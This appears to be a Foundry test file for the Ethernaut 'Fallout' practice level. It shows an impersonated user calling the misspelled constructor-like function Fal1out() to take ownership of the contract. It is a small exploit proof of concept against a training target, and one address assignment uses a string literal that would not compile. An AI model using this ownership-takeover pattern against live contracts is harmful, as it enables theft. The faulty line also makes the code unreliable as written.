// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/02.Fallout.sol";

contract FalloutTest is Test {

    Fallout fallout;
    address falloutAddr;
    address deployerAddr;

    function setUp() public {
        
    fallout = new Fallout();
    falloutAddr = address(fallout);
    deployerAddr = address(this);
    console.log("Deployer address :", address(this));
    console.log("Address of the deployed fallback contract :", falloutAddr);

    }
    
    function testBobAttack() public {
    address  bob = "0x3c352ea32dfbb757ccdf4b457e52daf6ecc21917";
    vm.startPrank(bob);
    console.log("Bob's address :", bob);
    fallout.Fal1out();
    address newOwner = fallout.owner();
    console.log("Owner after Bob's attack :", newOwner);

    }
    
}